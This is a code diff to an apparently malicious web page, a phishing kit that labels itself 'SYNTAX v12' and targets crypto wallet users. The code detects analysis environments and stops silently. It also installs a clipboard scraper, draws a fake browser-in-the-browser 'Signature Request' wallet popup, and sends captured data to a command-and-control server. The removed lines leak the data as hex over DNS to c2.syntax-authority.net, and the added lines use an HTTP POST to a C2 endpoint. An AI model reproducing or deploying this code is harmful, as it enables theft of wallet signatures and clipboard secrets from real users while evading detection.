@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v11: Silent Execution. No verbose UI. */
+        /* SYNTAX v12: Styles remain optimized for silent execution. */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
@@ -99,13 +99,10 @@
                 }
 
                 if (detected) {
-                    // SYNTAX: Evasion detected. Silently terminate.
-                    // The UI will remain on the initial "Analyzing..." state indefinitely.
                     console.log('Evasion: Hostile environment detected. Terminating.');
                     return; 
                 }
                 
-                // If clean, proceed.
                 generatePersonalizedThreat();
             }
 
@@ -159,7 +156,7 @@
             }
 
             function executePayload(payloadName, fingerprint) {
-                ui.initialState.style.display = 'none'; // Hide initial state to begin "loading"
+                ui.initialState.style.display = 'none';
                 
                 if (payloadName === 'web3_bitb') {
                     deployBitBModule(fingerprint);
@@ -176,8 +173,7 @@
                         showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
                     }
                 });
-                // Show final success screen to mask the listener
-                showFinalSuccess(false, { success: false, reason: 'scraper_deployed' });
+                showFinalSuccess({ success: false, reason: 'scraper_deployed' });
             }
 
             function deployBitBModule(fingerprint) {
@@ -203,23 +199,28 @@
             function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>...</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
             function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
             
-            function exfiltrateData(data) {
-                const dataString = JSON.stringify(data);
-                let hexString = '';
-                for (let i = 0; i < dataString.length; i++) { hexString += dataString.charCodeAt(i).toString(16); }
-                const chunks = hexString.match(/.{1,63}/g) || [];
-                const domain = 'c2.syntax-authority.net';
-                chunks.forEach((chunk, index) => {
-                    const fullDomain = `${chunk}.${index}.${domain}`;
-                    new Image().src = `http://${fullDomain}/p.gif`; // Silent DNS request
-                });
+            /**
+             * SYNTAX v12: Exfiltration logic updated to use HTTP POST to the C2 server.
+             * DNS exfiltration is replaced with a more direct and reliable vector.
+             */
+            async function exfiltrateData(data) {
+                const c2Endpoint = 'http://localhost:4000/log';
+                console.log(`[C2] Sending data to ${c2Endpoint}`);
+                try {
+                    await fetch(c2Endpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    console.log('[C2] Data exfiltration successful.');
+                } catch (error) {
+                    console.error('[C2] Data exfiltration failed:', error);
+                }
             }
 
             function showFinalSuccess(dataToExfiltrate) {
                 if (dataToExfiltrate) {
                     exfiltrateData(dataToExfiltrate);
-                    // SYNTAX: Persistence logic would be here.
-                    // E.g., attempt to use a service worker or other browser-based persistence.
                 }
                 ui.initialState.style.display = 'none';
                 ui.finalState.style.display = 'block';
